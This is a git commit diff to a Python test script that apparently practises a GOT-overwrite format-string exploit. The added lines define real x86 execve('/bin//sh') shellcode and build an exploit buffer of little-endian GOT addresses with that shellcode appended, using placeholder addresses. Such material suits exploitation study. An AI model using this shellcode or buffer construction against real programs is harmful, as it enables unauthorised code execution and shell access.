a37b010ac349de1c124c75ba4878ae9237ab8234
pelo0819 <canvas.pelo@gmail.com>
2020-11-29 15:23:53 +0900

    update

--- tests/got_overwrite/test.py
+++ tests/got_overwrite/test.py
@@ -5,14 +5,26 @@ from subprocess import Popen
 # addr = 0xbffff6f8
 addr_got = 0x000000ff
 addr_buf = 0x0000ff00
+
+# shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
+shellcode = "\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x8d\\x42\\x0b\\xcd\\x80"
+
+
+print('%d' % int('0x000000ff', 16))
 offset = 7
 print("addr_got:%d, addr_buf:%d, offset:%d" % (addr_got, addr_buf, offset))
 
-
+buf = ''
 for i in range(4):
     tmp_addr_got = addr_got + i
-    b = struct.pack('<I', tmp_addr_got)
-    print("b%d  value:%d, hex:%s" % (i, tmp_addr_got, b.decode()))
+    hex_str = format(tmp_addr_got, '08x')
+    for j in range(4):
+        idx = 8-2*(j+1)
+        buf += '\\x' + hex_str[idx] + hex_str[idx + 1]
+
+print(buf)
+buf += shellcode
+print(buf)
 
 slide_addr_buf = addr_buf + 16
 lit_addr_buf = struct.pack('<I', slide_addr_buf)
